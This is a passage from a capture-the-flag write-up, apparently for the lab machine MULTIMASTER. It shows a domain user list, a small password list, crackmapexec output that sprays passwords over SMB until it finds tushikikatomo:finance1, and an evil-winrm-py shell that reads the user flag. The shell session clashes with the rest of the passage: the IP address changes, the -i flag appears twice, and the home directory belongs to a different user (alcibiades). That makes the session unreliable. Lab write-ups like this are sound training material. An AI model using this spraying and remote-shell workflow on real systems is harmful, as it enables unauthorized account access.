SQLServer2005SQLBrowserUser$MULTIMASTER                              
svc-nas                              
svc-sql                              
test                               
tushikikatomo                              
zac                                
zpowers                              

```

password.list

```
password1
finance1
banking1
?
```

```
root@kali# crackmapexec smb 10.10.10.179 -u dom_users -p passwords --continue-on-success
SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP) (signing:True) (SMBv1:True)
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\MULTIMASTER$:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\MULTIMASTER$:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\MULTIMASTER$:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\DnsAdmins:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\DnsAdmins:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\DnsAdmins:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\DnsUpdateProxy:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\DnsUpdateProxy:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\DnsUpdateProxy:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\svc-nas:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\svc-nas:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\svc-nas:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\Privileged IT Accounts:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\Privileged IT Accounts:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\Privileged IT Accounts:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\tushikikatomo:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP\tushikikatomo:finance1 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\tushikikatomo:banking1 STATUS_ACCESS_DENIED 
...[snip]...
```

There’s one success: `MEGACORP\tushikikatomo:finance1`.

With these new creds, I have access to three shares:

### WinRM

I also have access to a shell over WinRM:

```
┌──(root㉿kali)-[~/Desktop]
└─# evil-winrm-py -i MEGACORP -u tushikikatomo -p finance1 -i 10.129.95.200 
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to '10.129.95.200:5985' as 'tushikikatomo'
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
evil-winrm-py PS C:\Users\alcibiades\Documents> cd ../Desktop
evil-winrm-py PS C:\Users\alcibiades\Desktop> type user.txt
4c1ad65c4429fa87e8463cfaf2ff03a1
evil-winrm-py PS C:\Users\alcibiades\Desktop>

```
